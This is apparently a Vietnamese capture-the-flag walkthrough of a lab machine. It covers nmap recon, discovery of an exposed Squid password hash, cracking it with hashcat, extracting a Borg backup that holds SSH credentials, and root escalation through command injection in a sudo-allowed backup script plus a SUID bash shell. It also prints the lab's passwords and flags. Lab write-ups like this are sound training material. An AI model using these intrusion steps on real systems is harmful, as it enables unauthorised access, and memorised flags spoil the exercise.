![[Screenshot 2026-01-27 at 16.10.55.png]]

## Recon 
Như thường lệ, chúng ta bắt đầu bằng việc quét nmap để liệt kê thông tin.
```bash
┌──(root㉿duongpahm)-[/home/duongpahm]
└─# nmap -sVC 10.48.139.68
Starting Nmap 7.98 ( https://nmap.org ) at 2026-01-27 04:11 -0500
Nmap scan report for 10.48.139.68
Host is up (0.10s latency).
Not shown: 998 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.10 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 db:b2:70:f3:07:ac:32:00:3f:81:b8:d0:3a:89:f3:65 (RSA)
|   256 68:e6:85:2f:69:65:5b:e7:c6:31:2c:8e:41:67:d7:ba (ECDSA)
|_  256 56:2c:79:92:ca:23:c3:91:49:35:fa:dd:69:7c:ca:ab (ED25519)
80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
|_http-title: Apache2 Ubuntu Default Page: It works
|_http-server-header: Apache/2.4.18 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 13.02 seconds
```
Ta thấy cổng 22 đang mở trên SSH, cổng 80 cũng mở cho http, như vậy bây giờ chúng ta sẽ kiểm tra chúng.
![[Screenshot 2026-01-27 at 16.19.44.png]]
Chúng ta thấy rằng đó là trang "Apache 2 Ubuntu Default Page" mặc định của Apache. Bây giờ, chúng ta sử dụng các công cụ kiểm thử để thực hiện fuzzing.
![[Screenshot 2026-01-27 at 16.22.52.png]]
Chúng ta có thể thấy rằng nó đã tiết lộ thông tin endpoint `/admin`, hãy thực hiện kiểm tra:
![[Screenshot 2026-01-27 at 16.24.14.png]]
Chúng ta thấy rằng đây là một page của một nhà sản xuất âm nhạc, chúng ta xem xét xung quanh và tìm thấy nút tải xuống trong kho lưu trữ. Điều này cho phép chúng ta tải tệp `archive.tar`. Chúng ta sẽ lưu tệp này lại để dùng sau.
Chuyển đến chúng ta thấy có một hộp chat nơi mọi người có thể nhắn tin cho nhau. Họ nói về một kho lưu trữ âm nhạc nhưng phần quan trọng nhất là phần về proxy Squid.
![[Screenshot 2026-01-27 at 16.27.48.png]]Squid về cơ bản chỉ là một proxy cho HTTP nhưng chúng ta không cần tìm hiểu quá nhiều về điều này. Họ nói rằng có một số tệp cấu hình nằm rải rác ở đó. Vì vậy, hãy tìm kiếm trên Google để tìm ra vị trí của chúng.
Chúng ta tìm thấy chúng nằm trong `/etc/squid/squid.conf`, sử dụng các công cụ fuzzing cũng tìm thấy thư mục`/etc`.![[Screenshot 2026-01-27 at 16.33.38.png]]
![[Screenshot 2026-01-27 at 16.33.50.png]]
**squid.conf**
```
auth_param basic program /usr/lib64/squid/basic_ncsa_auth /etc/squid/passwd
auth_param basic children 5
auth_param basic realm Squid Basic Authentication
auth_param basic credentialsttl 2 hours
acl auth_users proxy_auth REQUIRED
http_access allow auth_users
```
Như ta thấy ở dòng đầu tiên, nó đề cập đến một tập tin passwd.
```
music_archive:$apr1$BpZ.Q.1m$F0qqPwHSOG50URuOVQTTn.
```
Chúng ta thấy đây là một mã băm nên chúng ta tiến hành giải mã nó.
![[Screenshot 2026-01-27 at 16.36.38.png]]
hash-identifier cho thấy đó là định dạng MD5(APR), chúng ta chuyển sang các ví dụ của hashcat và tìm thấy chế độ cho điều này (1600). Hashcat giải mã băm:
```bash
┌──(duongpahm㉿duongpahm)-[~/Desktop]
└─$ hashcat -m 1600 hash.txt /usr/share/wordlists/rockyou.txt
hashcat (v7.1.2) starting

OpenCL API (OpenCL 3.0 PoCL 6.0+debian  Linux, None+Asserts, RELOC, SPIR-V, LLVM 18.1.8, SLEEF, POCL_DEBUG) - Platform #1 [The pocl project]
============================================================================================================================================
* Device #01: cpu--0x000, 1466/2933 MB (512 MB allocatable), 2MCU

Minimum password length supported by kernel: 0
Maximum password length supported by kernel: 256
Minimum salt length supported by kernel: 0
Maximum salt length supported by kernel: 256

Hashes: 1 digests; 1 unique digests, 1 unique salts
Bitmaps: 16 bits, 65536 entries, 0x0000ffff mask, 262144 bytes, 5/13 rotates
Rules: 1

Optimizers applied:
* Zero-Byte
* Single-Hash
* Single-Salt

ATTENTION! Pure (unoptimized) backend kernels selected.
Pure kernels can crack longer passwords, but drastically reduce performance.
If you want to switch to optimized kernels, append -O to your commandline.
See the above message to find out about the exact limits.

Watchdog: Temperature abort trigger set to 90c

Host memory allocated for this attack: 512 MB (1858 MB free)

Dictionary cache hit:
* Filename..: /usr/share/wordlists/rockyou.txt
* Passwords.: 14344385
* Bytes.....: 139921507
* Keyspace..: 14344385

$apr1$BpZ.Q.1m$F0qqPwHSOG50URuOVQTTn.:squidward           
                                                          
Session..........: hashcat
Status...........: Cracked
Hash.Mode........: 1600 (Apache $apr1$ MD5, md5apr1, MD5 (APR))
Hash.Target......: $apr1$BpZ.Q.1m$F0qqPwHSOG50URuOVQTTn.
Time.Started.....: Tue Jan 27 04:40:53 2026 (2 secs)
Time.Estimated...: Tue Jan 27 04:40:55 2026 (0 secs)
Kernel.Feature...: Pure Kernel (password length 0-256 bytes)
Guess.Base.......: File (/usr/share/wordlists/rockyou.txt)
Guess.Queue......: 1/1 (100.00%)
Speed.#01........:    17112 H/s (12.08ms) @ Accel:114 Loops:1000 Thr:1 Vec:4
Recovered........: 1/1 (100.00%) Digests (total), 1/1 (100.00%) Digests (new)
Progress.........: 38988/14344385 (0.27%)
Rejected.........: 0/38988 (0.00%)
Restore.Point....: 38760/14344385 (0.27%)
Restore.Sub.#01..: Salt:0 Amplifier:0-1 Iteration:0-1000
Candidate.Engine.: Device Generator
Candidates.#01...: 19631963 -> sanne
Hardware.Mon.#01.: Util:100%

Started: Tue Jan 27 04:40:44 2026
Stopped: Tue Jan 27 04:40:56 2026
```
Như vâỵ chúng ta đã có credentials: `music_archive:squidward`
```bash
┌──(duongpahm㉿duongpahm)-[~/Downloads]
└─$ tar -xvf archive.tar     
home/field/dev/final_archive/
home/field/dev/final_archive/hints.5
home/field/dev/final_archive/integrity.5
home/field/dev/final_archive/config
home/field/dev/final_archive/README
home/field/dev/final_archive/nonce
home/field/dev/final_archive/index.5
home/field/dev/final_archive/data/
home/field/dev/final_archive/data/0/
home/field/dev/final_archive/data/0/5
home/field/dev/final_archive/data/0/3
home/field/dev/final_archive/data/0/4
home/field/dev/final_archive/data/0/1
```
## Borg
### User 
Chúng ta có thể thấy các file:
```
config data hints.5 index.5 integrity.5 nonce README
```
Trước hết ta đọc file README:
```bash
┌──(duongpahm㉿duongpahm)-[~/…/home/field/dev/final_archive]
└─$ cat README      
This is a Borg Backup repository.
See https://borgbackup.readthedocs.io/
```
Như vậy, chúng ta đã xác định được một kho lưu trữ sao lưu sử dụng **Borg Backup**.
Borg là một phần mềm sao lưu hỗ trợ cơ chế nén và loại bỏ trùng lặp dữ liệu (deduplication). Trong quá trình phân tích, ta tình cờ phát hiện kho lưu trữ này được công khai trên GitHub và tiến hành tham khảo tài liệu chính thức tại địa chỉ:  [https://borgbackup.readthedocs.io/](https://borgbackup.readthedocs.io/)
Tiếp theo, ta nghiên cứu mục **Usage** trong tài liệu hướng dẫn. Tại đây, Borg cung cấp cú pháp trích xuất dữ liệu từ kho lưu trữ với lệnh:
```bash
borg extract /path/to/repo::my-files
```
Trong đó, tham số `/path/to/repo` tương ứng với đường dẫn tuyệt đối tới kho lưu trữ, có thể xác định bằng cách sử dụng lệnh `pwd` để lấy thư mục làm việc hiện tại.

Thành phần `my-files` biểu thị tên của một archive cụ thể bên trong repository. Dựa trên các thông tin đã thu thập trước đó, archive này nhiều khả năng là `music_archive`, trùng với tên người dùng được sử dụng để tạo giá trị băm (hash).
Do đó, ta có thể tiến hành trích xuất nội dung của archive tương ứng. Lưu ý rằng đường dẫn `/path/to/repo` có thể khác nhau tùy theo môi trường triển khai và cấu trúc thư mục của từng hệ thống. Lệnh sử dụng như sau:
```bash
borg extract /home/duongpahm/Downloads/home/field/dev/final_archive::music_archive
```
Trong quá trình thực thi, hệ thống yêu cầu mật khẩu để giải mã archive. Ta sử dụng mật khẩu **squidward** đã thu được trước đó thông qua quá trình bẻ khóa (cracking).
Sau khi quá trình trích xuất hoàn tất, toàn bộ dữ liệu trong archive đã được khôi phục thành công ra hệ thống tệp cục bộ. Tiếp tục duyệt vào thư mục:
```bash
┌──(duongpahm㉿duongpahm)-[~/…/home/field/dev/final_archive]
└─$ cat home/alex/Documents/note.txt
Wow I'm awful at remembering Passwords so I've taken my Friends advice and noting them down!

alex:S3cretP@s3
```
Như vậy, chúng ta đã thu thập được cặp thông tin xác thực hợp lệ. Với các thông tin này, ta có thể tiến hành thiết lập kết nối từ xa tới hệ thống mục tiêu thông qua giao thức **SSH** dưới quyền người dùng **“alex”**
![[Screenshot 2026-01-27 at 17.03.18.png]]
![[Screenshot 2026-01-27 at 17.05.13.png]]
Như vậy chúng ta đã thực hiện lấy được flag của user.
### Root
Để giành quyền truy cập ở mức **root**, tồn tại hai phương thức khai thác. Một trong số đó xuất phát từ một lỗi cấu hình trong quá trình xây dựng hệ thống. Chúng ta thực hiện kiểm tra với lệnh `sudo -l` để liệt kê các quyền sudo mà người dùng hiện tại đang có.
```bash
alex@ubuntu:~$ sudo -l
Matching Defaults entries for alex on ubuntu:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin
User alex may run the following commands on ubuntu:
    (ALL : ALL) NOPASSWD: /etc/mp3backups/backup.sh
```

Chúng ta có thể thấy user alex có thể chạy script này bằng `sudo` mà không cần nhập mật khẩu.
`/etc/mp3backups/backup.sh`  → Đây là một shell script chạy với đặc quyền root 
```bash
alex@ubuntu:/etc/mp3backups$ ls -la 
total 28
drwxr-xr-x   2 root root  4096 Dec 30  2020 .
drwxr-xr-x 133 root root 12288 Dec 31  2020 ..
-rw-r--r--   1 root root   339 Jan 27 02:12 backed_up_files.txt
-r-xr-xr--   1 alex alex  1083 Dec 30  2020 backup.sh
-rw-r--r--   1 root root    45 Jan 27 02:12 ubuntu-scheduled.tgz
```


```bash
alex@ubuntu:~$ cat /etc/mp3backups/backup.sh
#!/bin/bash

sudo find / -name "*.mp3" | sudo tee /etc/mp3backups/backed_up_files.txt


input="/etc/mp3backups/backed_up_files.txt"
#while IFS= read -r line
#do
  #a="/etc/mp3backups/backed_up_files.txt"
#  b=$(basename $input)
  #echo
#  echo "$line"
#done < "$input"

while getopts c: flag
do
        case "${flag}" in 
                c) command=${OPTARG};;
        esac
done

backup_files="/home/alex/Music/song1.mp3 /home/alex/Music/song2.mp3 /home/alex/Music/song3.mp3 /home/alex/Music/song4.mp3 /home/alex/Music/song5.mp3 /home/alex/Music/song6.mp3 /home/alex/Music/song7.mp3 /home/alex/Music/song8.mp3 /home/alex/Music/song9.mp3 /home/alex/Music/song10.mp3 /home/alex/Music/song11.mp3 /home/alex/Music/song12.mp3"

# Where to backup to.
dest="/etc/mp3backups/"

# Create archive filename.
hostname=$(hostname -s)
archive_file="$hostname-scheduled.tgz"

# Print start status message.
echo "Backing up $backup_files to $dest/$archive_file"

echo

# Backup the files using tar.
tar czf $dest/$archive_file $backup_files

# Print end status message.
echo
echo "Backup finished"

cmd=$($command)
echo $cmd
```
Ta có thể thấy rằng nó đang thực hiện một kịch bản sao lưu trên tất cả các tệp mp3 trong thư mục chính của người dùng. Tuy nhiên, có một phần nhất định trong tệp này nổi bật lên.
```bash
while getopts c: flag
do
        case "${flag}" in 
                c) command=${OPTARG};;
        esac
done
```
Hàm này nhận một tham số từ dòng lệnh (-c) và thực thi tham số đó ở cuối kịch bản.
```bash
cmd=$($command)
echo $cmd
```
Vậy chúng ta hãy thử chạy 
```bash
sudo /etc/mp3backups/backup.sh -c whoami
```
![[Screenshot 2026-01-27 at 17.15.29.png]]
Và ta có thể thấy nó đang được chạy với quyền root! Từ đây, ta có thể dễ dàng đọc cờ root nếu muốn. Nhưng chúng ta vẫn chưa xâm nhập được vào hệ thống :( Hãy lấy một shell!

Chúng ta có thể làm điều này bằng cách cấp cho /bin/bash bit SUID.
![[Screenshot 2026-01-27 at 17.16.43.png]]
Sau đó, chúng ta có thể chạy lệnh bash -p trong dòng lệnh và sẽ có được quyền truy cập shell với quyền root!!!
```bash
alex@ubuntu:/etc/mp3backups$ bash -p
bash-4.3# whoami
root
bash-4.3# cat root.txt 
flag{Than5s_f0r_play1ng_H0p£_y0u_enJ053d}
```

